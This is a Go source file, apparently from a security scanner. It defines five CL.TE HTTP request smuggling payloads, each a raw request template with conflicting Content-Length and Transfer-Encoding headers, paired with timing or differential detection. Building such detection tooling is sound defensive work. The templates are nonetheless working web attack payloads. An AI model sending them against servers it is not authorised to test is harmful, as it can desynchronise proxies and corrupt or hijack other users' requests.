package smuggling

// CL.TE Payloads — Frontend uses Content-Length, Backend uses
// Transfer-Encoding. The attack sends a request where CL is short, so
// the frontend forwards a partial body that the backend interprets as a
// smuggled request via chunked encoding.
var cltePayloads = []Payload{
	{
		Type:        PayloadCLTE,
		Name:        "clte-basic-timing",
		Description: "Basic CL.TE timing detection with delayed chunk",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"1\r\n" +
			"G\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Backend waits for more chunks if vulnerable",
		DetectionMethod:  DetectTiming,
	},
	{
		Type:        PayloadCLTE,
		Name:        "clte-smuggle-get",
		Description: "CL.TE smuggle a GET request to cause 404",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 6\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n" +
			"G",
		ExpectedBehavior: "Next request gets prepended with 'G', causing error",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadCLTE,
		Name:        "clte-full-smuggle",
		Description: "CL.TE full request smuggling with complete GET",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 35\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n" +
			"GET /404test HTTP/1.1\r\n" +
			"Foo: x",
		ExpectedBehavior: "Backend processes smuggled GET /404test",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadCLTE,
		Name:        "clte-timeout-probe",
		Description: "CL.TE probe that causes backend timeout waiting for chunk",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 3\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"8\r\n" +
			"SMUGGLED\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Backend times out waiting for complete chunked body",
		DetectionMethod:  DetectTiming,
	},
	{
		Type:        PayloadCLTE,
		Name:        "clte-differential",
		Description: "CL.TE differential response probe",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 8\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"\r\n" +
			"1\r\n" +
			"Z\r\n" +
			"Q",
		ExpectedBehavior: "Incomplete chunk causes backend to wait or error",
		DetectionMethod:  DetectTiming,
	},
}
